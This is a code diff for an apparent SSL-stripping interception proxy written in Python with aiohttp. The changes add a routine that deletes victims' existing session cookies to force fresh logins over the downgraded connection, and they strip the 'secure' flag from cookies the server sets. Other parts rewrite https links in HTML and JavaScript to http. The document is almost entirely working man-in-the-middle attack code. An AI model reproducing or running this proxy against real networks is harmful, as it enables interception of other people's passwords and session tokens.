@@ -15,6 +15,7 @@ HEADER_BLACKLIST = {
         'Content-Length',
         'Content-Encoding',
         'Transfer-Encoding',
+        'Set-Cookie'
     ]
 }
 
@@ -47,6 +48,7 @@ class Handler(object):
         return await self.strip_response(response, request['remote_socket'])
 
     async def proxy_request(self, request):
+        # check if URL was previously stripped and cached
         try:
             if (request.rel_url.human_repr()) in self.cache[request['remote_socket']][request.host]['rel_urls']:
                 scheme = 'https'
@@ -54,6 +56,18 @@ class Handler(object):
             scheme = request.scheme
         else:
             scheme = request.scheme
+
+        # Kill sesssions
+        for cookie in request.cookies.keys():
+            try:
+                if cookie in self.cache[request['remote_socket']][request.host]['cookies']:
+                    continue
+
+                del request.cookies[cookie]
+            except KeyError:
+                del request.cookies[cookie]
+
+        # potentially also remove certain types of auth (e.g. Authentication: Bearer)
 
         url = urllib.parse.urlunsplit((scheme,
                                        request.host,
@@ -80,8 +94,6 @@ class Handler(object):
         elif response.content_type == 'application/javascript':
             body = self.strip_javascript_body(await response.text(), remote_socket)
         else:
-            # eventually use aiohttp.web.StreamResponse in order to avoid reading whole
-            # request body into memory
             body = await response.read()
             # response.release()
 
@@ -96,17 +108,31 @@ class Handler(object):
         except KeyError:
             pass
 
-        # remove secure flag from cookies
-        try:
-            headers['Set-Cookie'] = COOKIE_SECURE_FLAG.sub(r'',
-                                                           headers['Set-Cookie'])
-        except KeyError:
-            pass
+        stripped_response = aiohttp.web.Response(body=body,
+                                                 status=response.status,
+                                                 headers=headers)
 
-        return aiohttp.web.Response(body=body,
-                                    status=response.status,
-                                    headers=headers)    
-        
+        # remove secure flag from cookies
+        for cookie_name, cookie_directives in response.cookies.items():
+            # cache newly-set cookies
+            self.cache.setdefault(remote_socket, {}).setdefault(response.url.host, {}).setdefault('cookies', set([])).add(cookie_name)
+
+            # remove "secure" directive
+            cookie_directives.pop('secure', None)
+
+            # aiohttp.web.Response.set_cookie doesn't allow "comment" directive
+            cookie_directives.pop('comment', None)
+
+            stripped_directives = {}
+            for directive_name, directive_value in cookie_directives.items():
+                if directive_value and cookie_directives.isReservedKey(directive_name):
+                    stripped_directives[directive_name.replace('-', '_')] = directive_value
+
+            stripped_response.set_cookie(cookie_name,
+                                         cookie_directives.value,
+                                         **stripped_directives)
+        return stripped_response
+
     def strip_html_body(self, body, remote_socket):
         soup = bs4.BeautifulSoup(body, 'html.parser')
         secure_url_attrs = []
@@ -142,11 +168,6 @@ class Handler(object):
             return 'http' + secure_url.group(2)
 
         return SECURE_URL.sub(generate_unsecure_replacement, body)
-
-    async def kill_sessions(request):
-        # remove existing cookies
-        # potentiall remove Authorization: Bearer entries
-        pass
 
 
 async def web_main():
